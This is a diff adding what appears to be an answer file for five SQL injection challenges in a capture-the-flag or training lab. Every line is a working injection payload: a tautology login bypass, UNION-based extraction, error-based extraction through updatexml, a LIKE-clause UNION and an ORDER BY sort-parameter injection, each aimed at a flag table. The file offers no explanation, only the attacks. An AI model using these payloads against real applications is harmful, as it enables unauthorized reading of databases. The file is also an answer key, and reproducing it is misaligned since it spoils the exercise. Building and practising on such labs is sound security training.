@@ -1,0 +1,15 @@
+challenge1
+'or'1'='1
+
+challenge2
+1' UNION SELECT 1, flag_value, 3 FROM sqli2_flags-- -
+
+challenge3
+1' AND updatexml(1, concat(0x3a, (SELECT flag FROM sqli_error_flags LIMIT 1)), 1)-- -
+
+challenge4
+a%' UNION SELECT 1, secret_code, 3, 4, 5, 6 FROM sqli_search_flags-- -
+
+
+challenge5
+?sort=revenue AND updatexml(1, concat(0x3a, (SELECT flag_token FROM sqli_orderby_flags LIMIT 1)), 1)
